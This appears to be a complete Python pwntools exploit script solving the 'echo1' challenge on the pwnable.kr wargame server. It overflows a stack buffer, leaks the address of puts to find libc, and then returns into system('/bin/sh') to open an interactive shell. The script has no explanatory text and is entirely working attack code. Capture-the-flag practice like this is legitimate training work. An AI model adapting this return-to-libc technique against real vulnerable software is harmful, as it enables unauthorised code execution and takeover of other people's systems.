#!/usr/bin/python2
#Author: Wh04m1 (@filip_dragovic)
from pwn import *

context(os='linux', arch='amd64',) #log_level='DEBUG')
elf = ELF('./echo1')
pr = asm('pop rdi; ret')
if args['REMOTE']:
        libc = ELF('libc6_2.23-0ubuntu10_amd64.so')
        p = remote('pwnable.kr', 9010)
else:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        p = process('./echo1')
p.sendlineafter(':', pr)
p.sendlineafter('>', '1')
payload = flat([cyclic(40), elf.sym['id'], elf.got['puts'], elf.plt['puts'], elf.sym['main']])
p.sendline(payload)
puts = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc.address = puts - libc.sym['puts']
success("puts will be @{0}".format(hex(puts)))
success("libc address will be @{0}".format(hex(libc.address)))
p.sendlineafter(':', pr)
p.sendlineafter('>', '1')
payload = flat([cyclic(40), elf.sym['id'], next(libc.search("/bin/sh\x00")), libc.sym["system"]])
p.sendline(payload)
p.sendline('id')
p.interactive()
